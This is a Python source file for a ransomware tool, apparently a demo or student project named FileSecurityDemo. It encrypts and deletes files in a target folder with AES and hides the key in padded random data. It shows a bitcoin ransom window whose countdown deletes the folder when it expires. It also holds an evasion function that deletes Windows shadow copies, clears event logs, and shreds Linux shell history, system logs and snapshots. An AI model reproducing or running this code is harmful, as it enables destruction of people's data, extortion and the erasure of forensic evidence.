import os
import base64
import shutil
import secrets
import hashlib
import subprocess
import sys
from tkinter import Tk, Label, Button, Entry, messagebox
import traceback
from PIL import Image, ImageTk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


class RansomwareEncryptor:
    ENCRYPTED_EXTENSION = ".encblob"
    HIDDEN_KEY_FILE = ".hidden_ransom_key.txt"
    HIDDEN_HASH_FILE = ".hidden_ransom_hash.txt"  
      
    KEY_OFFSET = 1024 * 1024    # 1MB offset
    HASH_OFFSET = 2 * 1024 * 1024  # 2MB offset

    def __init__(self, target_path):
        self.target_path = target_path
        self.key = None
        self.iv = None
        self.current_exe = sys.executable if getattr(sys, 'frozen', False) else None

    def generate_key_iv(self):
        self.key = secrets.token_bytes(32)
        self.iv = secrets.token_bytes(16)
        return self.key, self.iv

    def save_key(self): # Store key in 10MB file with random padding
        key_data = self.key + self.iv
        obfuscated = self._xor_obfuscate(key_data)
        
        # Create 10MB file with random data
        with open(self.HIDDEN_KEY_FILE, "wb") as f:
            f.write(os.urandom(10 * 1024 * 1024))
            f.seek(self.KEY_OFFSET)
            f.write(obfuscated)

    def load_key(self):
        """Retrieve key from hidden offset"""
        try:
            with open(self.HIDDEN_KEY_FILE, "rb") as f:
                f.seek(self.KEY_OFFSET)
                obfuscated = f.read(48)  # 32+16 bytes
                key_data = self._xor_obfuscate(obfuscated)
                self.key = key_data[:32]
                self.iv = key_data[32:]
        except FileNotFoundError:
            raise Exception("Decryption key not found - payment required")

    def _xor_obfuscate(self, data): # Simple XOR obfuscation with rotating key
        return bytes([b ^ (i % 256) for i, b in enumerate(data)])

    def save_hash(self, folder_path): # Store hash in 10MB file with random padding
        folder_hash = self.compute_folder_hash(folder_path)
        obfuscated_hash = self._xor_obfuscate(folder_hash.encode())
        
        with open(self.HIDDEN_HASH_FILE, "wb") as f:
            f.write(os.urandom(10 * 1024 * 1024))
            f.seek(self.HASH_OFFSET)
            f.write(obfuscated_hash)

    def load_hash(self):
        """Retrieve hash from hidden offset"""
        with open(self.HIDDEN_HASH_FILE, "rb") as f:
            f.seek(self.HASH_OFFSET)
            obfuscated = f.read(64)  # SHA256 hex length
            return self._xor_obfuscate(obfuscated).decode()
    

    def is_safe(self, file_path):
        safe_dirs = {'.qodo', 'assets', 'build', 'dist', 'scripts', 'src', 'venv'}
        safe_files = {
            '.hidden_ransom_key.txt',
            '.hidden_ransom_hash.txt',
            'FileSecurityDemo.exe',
            'main.spec'
        }

        if self.current_exe and file_path == self.current_exe:
            return True

        path_parts = os.path.normpath(file_path).split(os.sep)
        if any(part in safe_dirs for part in path_parts):
            return True

        if os.path.basename(file_path) in safe_files:
            return True

        return False


    def encrypt_file(self, file_path):
        enc_path = file_path + self.ENCRYPTED_EXTENSION

        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()

        with open(file_path, "rb") as fin, open(enc_path, "wb") as fout:
            while True:
                chunk = fin.read(1024 * 1024)  # 1 MB
                if not chunk:
                    break
                padded_chunk = padder.update(chunk)
                fout.write(encryptor.update(padded_chunk))

            padded_final = padder.finalize()
            fout.write(encryptor.update(padded_final))
            fout.write(encryptor.finalize())

        os.remove(file_path)
        return enc_path

    def decrypt_file(self, file_path):        
        orig_path = file_path.replace(self.ENCRYPTED_EXTENSION, "")

        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        decryptor = cipher.decryptor()
        unpadder = padding.PKCS7(128).unpadder()

        with open(file_path, "rb") as fin, open(orig_path, "wb") as fout:
            while True:
                chunk = fin.read(1024 * 1024)
                if not chunk:
                    break
                decrypted_chunk = decryptor.update(chunk)
                fout.write(unpadder.update(decrypted_chunk))

            final_data = decryptor.finalize()
            fout.write(unpadder.update(final_data))
            fout.write(unpadder.finalize())

        os.remove(file_path)
        return orig_path

    def encrypt_folder(self, folder_path):
        # self.evasion_techniques()
        self.generate_key_iv()
        self.save_key()
        self.save_hash(folder_path) 

        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                if self.is_safe(file_path):  
                    continue
                if not file.endswith(self.ENCRYPTED_EXTENSION) and not file.endswith(self.HIDDEN_KEY_FILE):
                    print(f"[+] Encrypting: {file_path}")
                    self.encrypt_file(file_path)

    def decrypt_folder(self, folder_path):
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith(self.ENCRYPTED_EXTENSION):
                    try:
                        self.decrypt_file(file_path)
                    except Exception as e:
                        print(f"[-] Failed to decrypt {file_path}: {e}")
        
        if self.verify_folder_integrity(folder_path):
            print("[+] Integrity verified: hashes match.")
        else:
            print("[-] Integrity check failed: folder contents may be altered.")
        print("[+] Folder decryption complete.")

    def folder_is_encrypted(self, folder_path):
        for root, _, files in os.walk(folder_path):
            for file in files:
                if file.endswith(self.ENCRYPTED_EXTENSION):
                    return True
        return False

    def show_ransom_gui(self, target_path):
        root = Tk()
        root.title("Ooops, your files have been encrypted!")
        root.geometry("550x350")
        root.configure(bg="black")

        # Determine project root 
        if getattr(sys, 'frozen', False): # Running as .exe
            base_path = sys._MEIPASS
        else:                             #  Running as python script
            base_path = os.path.dirname(os.path.dirname(__file__))

        ico_path = os.path.join(base_path, "assets", "images.ico")

        try:
            img = Image.open(ico_path)
            resample_filter = getattr(Image, "LANCZOS", Image.BICUBIC)
            img = img.resize((128, 128), resample_filter)
            tkimg = ImageTk.PhotoImage(img)
            Label(root, image=tkimg, bg="black").pack(pady=(10, 0))
            root.ransom_icon = tkimg  
            print("[DEBUG] Image loaded and displayed successfully")
        except Exception:
            print("[ERROR] Failed to load/display image:")
            traceback.print_exc()

        # Timer & cleanup
        timer_id = [None]
        time_left = [60]

        def safe_destroy():
            if timer_id[0]:
                root.after_cancel(timer_id[0])
            root.destroy()

        def on_check_payment():
            messagebox.showinfo("Payment", "Payment Verified. Key revealed.")
            self.load_key()
            self._decrypt_target(target_path)
            safe_destroy()

        def on_decrypt():
            entered_key = key_entry.get()
            try:
                decoded = base64.b64decode(entered_key)
                self.key = decoded[:32]
                self.iv = decoded[32:]
                self._decrypt_target(target_path)
                safe_destroy()
            except Exception:
                messagebox.showerror("Error", "Invalid key format.")

        def update_timer():
            if time_left[0] <= 0:
                if os.path.exists(target_path):
                    try:
                        if os.path.isfile(target_path):
                            os.remove(target_path)
                        else:
                            shutil.rmtree(target_path)
                    except Exception as e:
                        print("Cleanup failed:", e)
                safe_destroy()
            else:
                timer_label.config(text=f"Time remaining: {time_left[0]}s")
                time_left[0] -= 1
                timer_id[0] = root.after(1000, update_timer)

        Label(root, text="Ooops, your files have been encrypted!", font=("Helvetica", 16),
              fg="red", bg="black").pack(pady=10)
        Label(root, text="Send $600 worth of bitcoin to this address:",
              bg="black", fg="white").pack()
        Label(root, text="Hacker@gmail.com",
              bg="black", fg="white").pack(pady=5)
        Button(root, text="Check Payment", command=on_check_payment).pack(pady=5)

        Label(root, text="Or paste your key here to decrypt manually:",
              bg="black", fg="white").pack(pady=5)
        key_entry = Entry(root, width=50)
        key_entry.pack(pady=5)
        Button(root, text="Decrypt", command=on_decrypt).pack(pady=5)

        timer_label = Label(root, text=f"Time remaining: {time_left[0]}s",
                            fg="yellow", bg="black")
        timer_label.pack(pady=10)

        update_timer()
        root.mainloop()
    
    def show_post_encrypt_gui(self):
        root = Tk()
        root.title("!!! ALL YOUR FILES ARE GONE !!!")
        root.geometry("600x300")
        root.configure(bg="black")

        Label(
            root,
            text="YOUR FILES HAVE BEEN ENCRYPTED!",
            font=("Impact", 24, "bold"),
            fg="red",
            bg="black"
        ).pack(pady=(20,10))

        threat_msg = (
            "👾 All your precious data is now locked away from you. 👾\n\n"
            "To get them back, you must run this program again.\n"
            "Any delay will result in PERMANENT DELETION of everything!\n\n"
            "Tick-tock… We are watching you."
        )
        Label(
            root,
            text=threat_msg,
            font=("Arial", 12),
            fg="white",
            bg="black",
            justify="center"
        ).pack(pady=(0,20))

        Button(
            root,
            text="…I Understand…",
            font=("Helvetica", 14, "bold"),
            fg="black",
            bg="red",
            padx=10, pady=5,
            command=root.destroy
        ).pack(pady=(10,0))

        root.mainloop()
        
    def _decrypt_target(self, path):
        try:
            if os.path.isfile(path):
                self.decrypt_file(path)
            elif os.path.isdir(path):
                self.decrypt_folder(path)
            messagebox.showinfo("Success", "Decryption successful!")
        except Exception as e:
            messagebox.showerror("Error", f"Decryption failed: {str(e)}")

    def handle_encryption(self):
        if self.target_path.endswith(self.ENCRYPTED_EXTENSION) and os.path.isfile(self.target_path):
            print("[+] Encrypted file detected. Starting decryption...")
            self.show_ransom_gui(self.target_path)
            return

        elif os.path.isdir(self.target_path):
            if self.folder_is_encrypted(self.target_path):
                print("[+] Encrypted files detected in folder. Starting decryption...")
                self.show_ransom_gui(self.target_path)
            else:
                print("[+] No encrypted files found. Encrypting folder...")
                key, iv = self.generate_key_iv()
                self.save_key()
                self.encrypt_folder(self.target_path)
                self.show_post_encrypt_gui()
                print("Folder encrypted successfully.")

        elif os.path.exists(self.target_path) and os.path.isfile(self.target_path):
            print("[+] Encrypting regular file...")
            key, iv = self.generate_key_iv()
            self.save_key()
            encrypted_blob = self.encrypt_file(self.target_path, key, iv)
            self.show_post_encrypt_gui()
            print(f"File encrypted. Blob saved as: {encrypted_blob}")

        else:
            print("Target file or folder does not exist.")

#############################################################################################################
#### hashing functions (compute_folder_hash, save_hash, load_hash, verify_folder_integrity)
#############################################################################################################
    def compute_folder_hash(self, folder_path):
        entries = []
        for root, _, files in os.walk(folder_path):
            for filename in sorted(files):
                if filename.endswith(self.ENCRYPTED_EXTENSION):
                    continue
                if filename in (self.HIDDEN_KEY_FILE, self.HIDDEN_HASH_FILE):
                    continue
                file_path = os.path.join(root, filename)
                rel_path = os.path.relpath(file_path, folder_path)
                with open(file_path, 'rb') as f:
                    data = f.read()
                file_hash = hashlib.sha256(data).hexdigest()
                entries.append(f"{rel_path}:{file_hash}")
        combined = "\n".join(entries).encode('utf-8')
        return hashlib.sha256(combined).hexdigest()

    def verify_folder_integrity(self, folder_path):
        original_hash = self.load_hash()
        new_hash = self.compute_folder_hash(folder_path)
        return original_hash == new_hash
    
#############################################################################################################
#### Evanilson's function
############################################################################################################
    def evasion_techniques(self):
        """
        Performs OS-appropriate evasion techniques:
        - Windows: Disables recovery features and clears logs
        - Linux: Clears shell history and system logs
        Returns:
            bool: True if all operations succeeded, False otherwise
        """
        success = True
        try:
            if os.name == 'nt':
                # Windows techniques
                commands = [
                    ["vssadmin", "delete", "shadows", "/all", "/quiet"],
                    ["wevtutil", "cl", "System"],
                    ["powershell", "Clear-EventLog", "-LogName", "Security"]
                ]
            elif os.name == 'posix':
                # Linux techniques
                commands = [
                    # Clear shell history files
                    ["shred", "-uf", os.path.expanduser("~/.bash_history")],
                    ["shred", "-uf", os.path.expanduser("~/.zsh_history")],
                    # Clear system logs (requires root)
                    ["sudo", "shred", "-uf", "/var/log/syslog"],
                    ["sudo", "shred", "-uf", "/var/log/auth.log"],
                    # Clear temporary files
                    ["sudo", "shred", "-uf", "/tmp/*"],
                    # Remove LVM snapshots if exist
                    ["sudo", "lvremove", "-f", "/dev//snap"]
                ]
            else:
                return False  # Unsupported OS

            for cmd in commands:
                try:
                    result = subprocess.run(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        check=True,
                        timeout=10
                    )
                except (subprocess.CalledProcessError, 
                        subprocess.TimeoutExpired,
                        FileNotFoundError,
                        PermissionError):
                    success = False

        except Exception as e:
            success = False

        return success